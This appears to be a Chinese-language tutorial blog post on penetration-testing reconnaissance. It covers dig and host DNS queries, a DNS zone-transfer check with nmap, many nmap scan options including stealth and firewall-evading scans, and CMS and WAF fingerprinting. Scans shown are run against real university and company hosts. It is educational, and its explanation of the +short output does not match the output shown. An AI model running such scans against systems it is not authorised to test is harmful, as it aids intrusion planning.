<p>注：WWW2是万维网中分流服务器的子域名，主要用于识别一个域名内一些相关的网站。<a href="http://www.example.org、www2.example.org及www3.example.org就是其中的例子.这些子域名可以延续至www3、www4、www5、www6等,如此类推.一般来说,使用这些域名是为了服务器负载均衡.有时候,即使在浏览网站镜像,这些特别的域名会被隐藏,显示出来的仍是“www”/">www.example.org、www2.example.org及www3.example.org就是其中的例子。这些子域名可以延续至WWW3、WWW4、WWW5、WWW6等，如此类推。一般来说，使用这些域名是为了服务器负载均衡。有时候，即使在浏览网站镜像，这些特别的域名会被隐藏，显示出来的仍是“WWW”</a></p>
<p>==示例==</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/home/toor/桌面<span class="comment"># host -t a www2.hdu.edu.cn</span></span><br><span class="line">www2.hdu.edu.cn is an <span class="built_in">alias</span> <span class="keyword">for</span> www2.split.hdu.edu.cn.</span><br><span class="line">www2.split.hdu.edu.cn has address 218.75.123.181</span><br><span class="line">www2.split.hdu.edu.cn has address 218.75.123.182</span><br><span class="line">root@kali:/home/toor/桌面<span class="comment"># dig -x 218.75.123.181 @dns1.hdu.edu.cn</span></span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.14-3-Debian &lt;&lt;&gt;&gt; -x 218.75.123.181 @dns1.hdu.edu.cn</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: REFUSED, id: 49625</span><br><span class="line">;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line">;; WARNING: recursion requested but not available</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;181.123.75.218.in-addr.arpa.   IN      PTR</span><br><span class="line"></span><br><span class="line">;; Query time: 35 msec</span><br><span class="line">;; SERVER: 210.32.32.1<span class="comment">#53(210.32.32.1)</span></span><br><span class="line">;; WHEN: 三 11月 11 19:36:19 CST 2020</span><br><span class="line">;; MSG SIZE  rcvd: 56</span><br></pre></td></tr></table></figure>
<h4 id="dig-命令"><a href="#dig-命令" class="headerlink" title="dig 命令"></a>dig 命令</h4><h5 id="查询单个域名的-DNS-信息"><a href="#查询单个域名的-DNS-信息" class="headerlink" title="查询单个域名的 DNS 信息"></a>查询单个域名的 DNS 信息</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/home/toor/桌面<span class="comment"># dig baidu.com</span></span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.14-3-Debian &lt;&lt;&gt;&gt; baidu.com</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 17680</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 0</span><br><span class="line"></span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;baidu.com.                     IN      A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">baidu.com.              5       IN      A       39.156.69.79</span><br><span class="line">baidu.com.              5       IN      A       220.181.38.148</span><br><span class="line"></span><br><span class="line">;; Query time: 5 msec</span><br><span class="line">;; SERVER: 192.168.160.2<span class="comment">#53(192.168.160.2)</span></span><br><span class="line">;; WHEN: 三 11月 11 20:21:58 CST 2020</span><br><span class="line">;; MSG SIZE  rcvd: 59</span><br><span class="line"></span><br><span class="line">dig 命令默认的输出信息比较丰富，大概可以分为 5 个部分。</span><br><span class="line">第一部分显示 dig 命令的版本和输入的参数。</span><br><span class="line">第二部分显示服务返回的一些技术详情，比较重要的是 status。如果 status 的值为 NOERROR 则说明本次查询成功结束。</span><br><span class="line">第三部分中的 <span class="string">&quot;QUESTION SECTION&quot;</span> 显示我们要查询的域名。</span><br><span class="line">第四部分的 <span class="string">&quot;ANSWER SECTION&quot;</span> 是查询到的结果。</span><br><span class="line">第五部分则是本次查询的一些统计信息，比如用了多长时间，查询了哪个 DNS 服务器，在什么时间进行的查询等等。</span><br><span class="line"></span><br><span class="line">默认情况下 dig 命令查询 A 记录，上图中显示的 A 即说明查询的记录类型为 A 记录。在尝试查询其它类型的记录前让我们先来了解一下常见的 DNS 记录类型。</span><br><span class="line"></span><br><span class="line">status: NOERROR表示查询成功</span><br><span class="line">而NXDOMAIN是DNS解析器（即客户端）在解析域名的请求发送到DNS且无法解析为IP地址时收到的DNS消息类型。NXDOMAIN错误消息表示该域不存在。</span><br></pre></td></tr></table></figure>
<h5 id="查询-CNAME-类型的记录"><a href="#查询-CNAME-类型的记录" class="headerlink" title="查询 CNAME 类型的记录"></a>查询 CNAME 类型的记录</h5><p>除了 A 记录，常见的 DNS 记录还有 CNAME，我们可以在查询时指定要查询的 DNS 记录类型：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/home/toor/桌面<span class="comment"># dig abc.filterinto.com CNAME</span></span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.14-3-Debian &lt;&lt;&gt;&gt; abc.filterinto.com CNAME</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 52381</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 0</span><br><span class="line"></span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;abc.filterinto.com.            IN      CNAME</span><br><span class="line"></span><br><span class="line">;; AUTHORITY SECTION:</span><br><span class="line">filterinto.com.         5       IN      SOA     jm1.dns.com. admin.dns.com. 1579140945 7200 3600 1209600 1800</span><br><span class="line"></span><br><span class="line">;; Query time: 388 msec</span><br><span class="line">;; SERVER: 192.168.160.2<span class="comment">#53(192.168.160.2)</span></span><br><span class="line">;; WHEN: 三 11月 11 20:23:29 CST 2020</span><br><span class="line">;; MSG SIZE  rcvd: 86</span><br></pre></td></tr></table></figure>
<h5 id="从指定的-DNS-服务器上查询"><a href="#从指定的-DNS-服务器上查询" class="headerlink" title="从指定的 DNS 服务器上查询"></a>从指定的 DNS 服务器上查询</h5><p>由于一些原因，希望从指定的 DNS 服务器上进行查询(从默认的 DNS 服务器上获得的结果可能不准确)。指定 DNS 服务器的方式为使用 @ 符号：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dig @8.8.8.8 abc.filterinto.com</span><br><span class="line"></span><br><span class="line">root@kali:/home/toor/桌面<span class="comment"># dig @8.8.8.8 abc.filterinto.com</span></span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.14-3-Debian &lt;&lt;&gt;&gt; @8.8.8.8 abc.filterinto.com</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 2190</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 0</span><br><span class="line"></span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;abc.filterinto.com.            IN      A</span><br><span class="line"></span><br><span class="line">;; AUTHORITY SECTION:</span><br><span class="line">filterinto.com.         600     IN      SOA     jm1.dns.com. admin.dns.com. 1579140945 7200 3600 1209600 1800</span><br><span class="line"></span><br><span class="line">;; Query time: 60 msec</span><br><span class="line">;; SERVER: 8.8.8.8<span class="comment">#53(8.8.8.8)</span></span><br><span class="line">;; WHEN: 三 11月 11 20:26:18 CST 2020</span><br><span class="line">;; MSG SIZE  rcvd: 86</span><br></pre></td></tr></table></figure>
<p>从上图可以看到本次查询的 DNS 服务器为 8.8.8.8。<br>如果不指定 DNS 服务器，dig 会依次使用 /etc/resolv.conf 里的地址作为 DNS 服务器</p>
<h5 id="反向查询"><a href="#反向查询" class="headerlink" title="反向查询"></a>反向查询</h5><p>在前面的查询中我们指定了查询服务器为 8.8.8.8，这是谁家的 DNS 服务器？其实我们可以使用 dig 的 -x 选项来反向解析 IP 地址对应的域名：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/home/toor/桌面<span class="comment"># dig -x 8.8.8.8 +short</span></span><br><span class="line">dns.google.</span><br></pre></td></tr></table></figure>
<h5 id="控制显示结果"><a href="#控制显示结果" class="headerlink" title="控制显示结果"></a>控制显示结果</h5><p>dig 命令默认返回的结果展示详细的信息，如果要获得精简的结果可以使用 +short 选项：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/home/toor/桌面<span class="comment"># dig +short www.baidu.com</span></span><br><span class="line">www.a.shifen.com.</span><br><span class="line">61.135.169.121</span><br><span class="line">61.135.185.32</span><br><span class="line"></span><br><span class="line">因为使用了+short参数，所以读者朋友需要注意结果中都代表了什么：</span><br><span class="line"></span><br><span class="line">1) 第1行是MX记录</span><br><span class="line"></span><br><span class="line">2) 第2行是TXT记录</span><br><span class="line"></span><br><span class="line">3) 第3行是SOA记录</span><br><span class="line"></span><br><span class="line">4) 第4到9行是NS记录</span><br><span class="line"></span><br><span class="line">5) 第10到11行是A记录</span><br><span class="line"></span><br><span class="line">这下显示的结果就清爽多了。</span><br><span class="line">其实我们还可以通过更多选项来控制输出的内容，比如只想显示 <span class="string">&quot;ANSWER SECTION&quot;</span> 的内容：</span><br><span class="line"></span><br><span class="line">$ dig abc.filterinto.com +nocomments +noquestion +noauthority +noadditional +nostats</span><br><span class="line"></span><br><span class="line">这个结果很不错，就是使用的选项太多了(dig 命令有很多这样的选项，详情请参考使用手册)。我们可以换一种优雅一些的方式来实现和上面相同的结果：</span><br><span class="line"></span><br><span class="line">$ dig abc.filterinto.com +noall +answer</span><br></pre></td></tr></table></figure>
<h5 id="查看-TTL-Time-to-Live"><a href="#查看-TTL-Time-to-Live" class="headerlink" title="查看 TTL(Time to Live)"></a>查看 TTL(Time to Live)</h5><p>TTL 是 DNS 解析中很重要的指标，主要是控制 DNS 记录在 DNS 服务器上的缓存时间：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dig baidu.com</span><br><span class="line"></span><br><span class="line">root@kali:/home/toor/桌面<span class="comment"># dig baidu.com</span></span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.14-3-Debian &lt;&lt;&gt;&gt; baidu.com</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 23733</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 5, ADDITIONAL: 5</span><br><span class="line"></span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;baidu.com.                     IN      A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">baidu.com.              5       IN      A       39.156.69.79</span><br><span class="line">baidu.com.              5       IN      A       220.181.38.148</span><br><span class="line"></span><br><span class="line">;; AUTHORITY SECTION:</span><br><span class="line">baidu.com.              5       IN      NS      ns3.baidu.com.</span><br><span class="line">baidu.com.              5       IN      NS      ns4.baidu.com.</span><br><span class="line">baidu.com.              5       IN      NS      ns7.baidu.com.</span><br><span class="line">baidu.com.              5       IN      NS      dns.baidu.com.</span><br><span class="line">baidu.com.              5       IN      NS      ns2.baidu.com.</span><br><span class="line"></span><br><span class="line">;; ADDITIONAL SECTION:</span><br><span class="line">ns7.baidu.com.          5       IN      A       180.76.76.92</span><br><span class="line">ns2.baidu.com.          5       IN      A       220.181.33.31</span><br><span class="line">dns.baidu.com.          5       IN      A       202.108.22.220</span><br><span class="line">ns4.baidu.com.          5       IN      A       14.215.178.80</span><br><span class="line">ns3.baidu.com.          5       IN      A       112.80.248.64</span><br><span class="line"></span><br><span class="line">;; Query time: 7 msec</span><br><span class="line">;; SERVER: 192.168.160.2<span class="comment">#53(192.168.160.2)</span></span><br><span class="line">;; WHEN: 三 11月 11 20:37:18 CST 2020</span><br><span class="line">;; MSG SIZE  rcvd: 229</span><br><span class="line"></span><br><span class="line">5为缓存时间</span><br><span class="line">查询结果中的单位是秒。通过下面的命令可以显示精简一些测结果：</span><br><span class="line">dig +nocmd +noall +answer +ttlid baidu.com</span><br></pre></td></tr></table></figure>

<p>在线查询也是一种办法  <a href="http://dns.aizhan.com/">http://dns.aizhan.com/</a><br>想要获得完整的信息，可以多尝试不同的工具，整合结果。很多工具无法做反向查询的原因，在于域名所有者没有添加反向解析记录。</p>
<h3 id="关于DNS区域传送漏洞"><a href="#关于DNS区域传送漏洞" class="headerlink" title="关于DNS区域传送漏洞"></a>关于DNS区域传送漏洞</h3><p>区域传送操作指的是一台后备服务器使用来自主服务器的数据刷新自己的zone数据库。一般来说，DNS区域传送操作只在网络里真的有后备域名DNS服务器时才有必要执行，但许多DNS服务器却被错误地配置成只要有人发出请求，就会向对方提供一个zone数据库的拷贝。当一个单位没有使用公用/私用DNS机制来分割外部公用DNS信息和内部私用DNS信息的时候，此时内部主机名和IP地址都暴露给了攻击者。就像是把一个单位的内部网络完整蓝图或导航图奉送给了别人。</p>
<p>使用nmap扫描器和dig来得到DNS Zone Transfer记录。</p>
<p>使用nmap扫描器附带的脚本，可以扫描DNS服务器是否存在域传送漏洞。语法为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap --script dns-zone-transfer --script-args dns-zone-trans</span><br><span class="line">fer.domain=nwpu.edu.cn -p 53 -Pn dns.nwpu.edu.cn</span><br></pre></td></tr></table></figure>
<p>对上述命令命令说明如下：</p>
<p>nmap –script dns-zone-transfer表示加载nmap文件夹下的脚本文件dns-zone-transfer.nse，扩展名.nse可省略</p>
<p>–script-args dns-zone-transfer.domain=zonetransfer.me向脚本传递参数，设置列出记录的域是nwpu.edu.cn</p>
<p>-p 53设置扫描53端口</p>
<p>-Pn设置通过Ping发现主机是否存活</p>
<h3 id="通过端口判断服务"><a href="#通过端口判断服务" class="headerlink" title="通过端口判断服务"></a>通过端口判断服务</h3><p>nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.用主机名和IP地址扫描系统</span><br><span class="line">主机名</span><br><span class="line"></span><br><span class="line">nmap server2.tecmint.com</span><br><span class="line">IP</span><br><span class="line"></span><br><span class="line">nmap 192.168.0.101</span><br><span class="line">2.扫描使用“-v”选项</span><br><span class="line">你可以看到下面的命令使用“ -v “选项后给出了远程机器更详细的信息。</span><br><span class="line"></span><br><span class="line">nmap -v server2.tecmint.com</span><br><span class="line">3.扫描多台主机</span><br><span class="line">在Nmap命令后加上多个IP地址或主机名来扫描多台主机。</span><br><span class="line"></span><br><span class="line">nmap 192.168.0.101 192.168.0.102 192.168.0.103 </span><br><span class="line">4.扫描整个子网</span><br><span class="line">可以使用*通配符来扫描整个子网或某个范围的IP地址</span><br><span class="line"></span><br><span class="line">nmap 192.168.0.*</span><br><span class="line">5.使用IP地址的最后一个字节扫描多台服务器</span><br><span class="line">指定IP地址的最后一个字节来对多个IP地址进行扫描。例如，我在下面执行中扫描了IP地址192.168.0.101，192.168.0.102和192.168.0.103。</span><br><span class="line"></span><br><span class="line">nmap 192.168.0.101,102,103 </span><br><span class="line">6.从一个文件中扫描主机列表</span><br><span class="line">如果你有多台主机需要扫描且所有主机信息都写在一个文件中，那么你可以直接让nmap读取该文件来执行扫描，让我们来看看如何做到这一点。</span><br><span class="line">创建一个名为“nmaptest.txt ”的文本文件，并定义所有你想要扫描的服务器IP地址或主机名。</span><br><span class="line"></span><br><span class="line"> cat &gt; nmaptest.txt </span><br><span class="line">localhost</span><br><span class="line">server2.tecmint.com</span><br><span class="line">192.168.0.101</span><br><span class="line">接下来运行带“iL” 选项的nmap命令来扫描文件中列出的所有IP地址</span><br><span class="line"></span><br><span class="line">nmap -iL nmaptest.txt </span><br><span class="line">7..扫描一个IP地址范围</span><br><span class="line">nmap 192.168.0.101-110 </span><br><span class="line">8.排除一些远程主机后再扫描</span><br><span class="line">在执行全网扫描或用通配符扫描时你可以使用“-exclude”选项来排除某些你不想要扫描的主机。</span><br><span class="line"></span><br><span class="line"> nmap 192.168.0.* --exclude 192.168.0.100</span><br><span class="line">9.扫描操作系统信息和路由跟踪</span><br><span class="line">使用Nmap，你可以检测远程主机上运行的操作系统和版本。为了启用操作系统和版本检测，脚本扫描和路由跟踪功能，我们可以使用NMAP的“-A“选项。</span><br><span class="line"></span><br><span class="line">nmap -A 192.168.0.101</span><br><span class="line">10.启用Nmap的操作系统探测功能</span><br><span class="line">使用选项“-O”和“-osscan-guess”也帮助探测操作系统信息。</span><br><span class="line"></span><br><span class="line">nmap -O server2.tecmint.com</span><br><span class="line">11.扫描主机侦测防火墙</span><br><span class="line">下面的命令将扫描远程主机以探测该主机是否使用了包过滤器或防火墙。</span><br><span class="line"></span><br><span class="line">nmap -sA 192.168.0.101</span><br><span class="line">12.扫描主机检测是否有防火墙保护</span><br><span class="line">扫描主机检测其是否受到数据包过滤软件或防火墙的保护。</span><br><span class="line"></span><br><span class="line">nmap -PN 192.168.0.101</span><br><span class="line">13.找出网络中的在线主机</span><br><span class="line">使用“-sP”选项，我们可以简单的检测网络中有哪些在线主机，该选项会跳过端口扫描和其他一些检测。</span><br><span class="line"></span><br><span class="line">nmap -sP 192.168.0.*</span><br><span class="line">14.执行快速扫描</span><br><span class="line">你可以使用“-F”选项执行一次快速扫描，仅扫描列在nmap-services文件中的端口而避开所有其它的端口。</span><br><span class="line"></span><br><span class="line">nmap -F 192.168.0.101</span><br><span class="line">15.查看Nmap的版本</span><br><span class="line">nmap -V</span><br><span class="line">顺序扫描端口</span><br><span class="line">使用“-r”选项表示不会随机的选择端口扫描。</span><br><span class="line"></span><br><span class="line">nmap -r 192.168.0.101</span><br><span class="line">17.打印主机接口和路由</span><br><span class="line">你可以使用nmap的“–iflist”选项检测主机接口和路由信息。</span><br><span class="line"></span><br><span class="line">nmap --iflist</span><br><span class="line">18.扫描特定的端口</span><br><span class="line">使用Nmap扫描远程机器的端口有各种选项，你可以使用“-P”选项指定你想要扫描的端口，默认情况下nmap只扫描TCP端口。</span><br><span class="line"></span><br><span class="line">nmap -p 80 server2.tecmint.com</span><br><span class="line">19.扫描TCP端口</span><br><span class="line">你可以指定具体的端口类型和端口号来让nmap扫描。</span><br><span class="line"></span><br><span class="line"> nmap -p T:8888,80 server2.tecmint.com</span><br><span class="line">20.扫描UDP端口</span><br><span class="line">nmap -sU 53 server2.tecmint.com</span><br><span class="line">21.扫描多个端口</span><br><span class="line">你还可以使用选项“-P”来扫描多个端口。</span><br><span class="line"></span><br><span class="line">nmap -p 80,443 192.168.0.101</span><br><span class="line">22.扫描指定范围内的端口</span><br><span class="line">您可以使用表达式来扫描某个范围内的端口。</span><br><span class="line"></span><br><span class="line">nmap -p 80-160 192.168.0.101</span><br><span class="line">23.查找主机服务版本号</span><br><span class="line">nmap -sV 192.168.0.101</span><br><span class="line">24.使用TCP ACK (PA)和TCP Syn (PS)扫描远程主机</span><br><span class="line">有时候包过滤防火墙会阻断标准的ICMP ping请求，在这种情况下，我们可以使用TCP ACK和TCP Syn方法来扫描远程主机。</span><br><span class="line"></span><br><span class="line">nmap -PS 192.168.0.101</span><br><span class="line">25.使用TCP ACK扫描远程主机上特定的端口</span><br><span class="line"> nmap -PA -p 22,80 192.168.0.101</span><br><span class="line">26. 使用TCP Syn扫描远程主机上特定的端口</span><br><span class="line">nmap -PS -p 22,80 192.168.0.101</span><br><span class="line">27.执行一次隐蔽的扫描</span><br><span class="line">nmap -sS 192.168.0.101</span><br><span class="line">28.使用TCP Syn扫描最常用的端口</span><br><span class="line">nmap -sT 192.168.0.101</span><br><span class="line">29.执行TCP空扫描以骗过防火墙</span><br><span class="line">nmap -sN 192.168.0.101</span><br></pre></td></tr></table></figure>
<h4 id="使用Nmap进行操作系统探测"><a href="#使用Nmap进行操作系统探测" class="headerlink" title="使用Nmap进行操作系统探测"></a>使用Nmap进行操作系统探测</h4><p>使用Nmap识别操作系统最简单的方法为使用-O参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/home/toor/桌面<span class="comment"># nmap -O ctf.hnp.edu.cn</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-11 20:56 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> ctf.hnp.edu.cn (183.169.148.18)</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">8000/tcp open  http-alt</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: specialized|WAP|phone</span><br><span class="line">Running: iPXE 1.X, Linux 2.4.X|2.6.X, Sony Ericsson embedded</span><br><span class="line">OS CPE: cpe:/o:ipxe:ipxe:1.0.0%2b cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:sonyericsson:u8i_vivaz</span><br><span class="line">OS details: iPXE 1.0.0+, Tomato 1.28 (Linux 2.4.20), Tomato firmware (Linux 2.6.22), Sony Ericsson U8i Vivaz mobile phone</span><br><span class="line"></span><br><span class="line">OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 7.63 seconds</span><br></pre></td></tr></table></figure>
<h4 id="使用p0f进行操作系统探测"><a href="#使用p0f进行操作系统探测" class="headerlink" title="使用p0f进行操作系统探测"></a>使用p0f进行操作系统探测</h4><p>p0f是一款被动探测工具，通过分析网络数据包来判断操作系统类型。同时p0f在网络分析方面功能强大，可以用它来分析NAT、负载均衡、应用代理等。下面命令的含义为监听网卡eth0，并开启混杂模式。这样会监听到每一个网络连接，部分结果摘录如下：</p>
<h3 id="站点信息收集"><a href="#站点信息收集" class="headerlink" title="站点信息收集"></a>站点信息收集</h3><p>接下来我们进行web网站站点信息收集，主要收集如下信息：</p>
<p>CMS指纹识别</p>
<p>历史漏洞</p>
<p>脚本语言</p>
<p>敏感目录/文件</p>
<p>Waf识别</p>
<h4 id="CMS指纹识别"><a href="#CMS指纹识别" class="headerlink" title="CMS指纹识别"></a>CMS指纹识别</h4><p>CMS（内容管理系统）又称为整站系统或文章系统，用于网站内容管理。用户只需要下载对应的CMS软件包，就能部署搭建，并直接利用CMS。但是各种CMS都具有其独特的结构命名规则和特定的文件内容，因此可以利用这些内容来获取CMS站点的具体软件CMS与版本。</p>
<p>在渗透测试中，对进行指纹识别是相当有必要的，识别出相应的CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。</p>
<p>常见的CMS有Dedecms(织梦)、Discuz、PHPWEB、PHPWind、PHPCMS、ECShop、Dvbbs、SiteWeaver、ASPCMS、帝国、Z-Blog、WordPress等。</p>
<p>（1）在线识别</p>
<p>如今，网上一些在线的网站查询CMS指纹识别，如下所示：</p>
<p>BugScaner: <a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p>
<p>潮汐指纹：<a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></p>
<p>云悉：<a href="http://www.yunsee.cn/info.html">http://www.yunsee.cn/info.html</a></p>
<p>WhatWeb: <a href="https://whatweb.net/">https://whatweb.net/</a></p>
<p>云悉指纹: <a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a></p>
<p>（2）利用工具</p>
<p>常见的CMS指纹识别工具有WhatWeb、WebRobo、椰树、御剑Web指纹识别。大禹CMS识别程序等，可以快速识别一些主流CMS。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/home/toor/桌面<span class="comment"># whatweb www.kingcms.com</span></span><br><span class="line">/usr/lib/ruby/vendor_ruby/target.rb:188: warning: URI.escape is obsolete</span><br><span class="line">/usr/lib/ruby/vendor_ruby/target.rb:188: warning: URI.escape is obsolete</span><br><span class="line">http://www.kingcms.com [301 Moved Permanently] Country[HONG KONG][HK], HTTPServer[nginx], IP[39.108.101.13], RedirectLocation[https://www.kingcms.com/], Title[301 Moved Permanently], nginx  </span><br><span class="line">https://www.kingcms.com/ [200 OK] Country[HONG KONG][HK], HTTPServer[nginx], IP[39.108.101.13], JQuery, PasswordField[userpass], Script[text/javascript], Title[KingCMS内容管理系统 - CMS界的轻骑士], nginx                                                                                 </span><br><span class="line">root@kali:/home/toor/桌面<span class="comment"># whatweb www.abscale.net</span></span><br><span class="line">/usr/lib/ruby/vendor_ruby/target.rb:188: warning: URI.escape is obsolete</span><br><span class="line">/usr/lib/ruby/vendor_ruby/target.rb:188: warning: URI.escape is obsolete</span><br><span class="line">http://www.abscale.net [301 Moved Permanently] Apache, Country[CHINA][CN], HTTPServer[Apache], IP[121.40.240.49], RedirectLocation[https://www.abscale.net], Title[301 Moved Permanently]     </span><br><span class="line">https://www.abscale.net [200 OK] Apache, Cookies[PHPSESSID], Country[CHINA][CN], HTTPServer[Apache], IP[121.40.240.49], JQuery[1.7.1], Script[text/javascript], Title[米粉生产线|面条生产线|米粉自动称重包装|面条自动称重包装-广东安本智能机器有限公司], X-Powered-By[ThinkPHP]</span><br></pre></td></tr></table></figure>



<p>如上图，WhatWeb将目标站点的服务器、中间节、cms等都识别了出来。</p>
<p>当我们得知了一个站点的cms类型后，我们可以在网上查找与其相关的漏洞并进行相应的测试。</p>
<p>（3）手工识别</p>
<ol>
<li>根据HTTP响应头判断，重点关注X-Powered-By、cookie等字段</li>
<li>根据HTML 特征，重点关注 body、title、meta等标签的内容和属性。</li>
<li>根据特殊的class判断。HTML 中存在特定 class 属性的某些 div 标签，如<body class="ke-content"><br>……</body></li>
</ol>
<h4 id="WAF检测"><a href="#WAF检测" class="headerlink" title="WAF检测"></a>WAF检测</h4><p>WafW00f是Python脚本，用于检测网络服务是否处于网络应用防火墙保护状态，极其有用。使用WafW00f检测网络服务器和网络传输之间是否存在网络应用防火墙，这不仅可以发展测试战略，而且还能开发出绕过网络应用防火墙的高级技术。简单用法 wafw00f URL</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
</search>
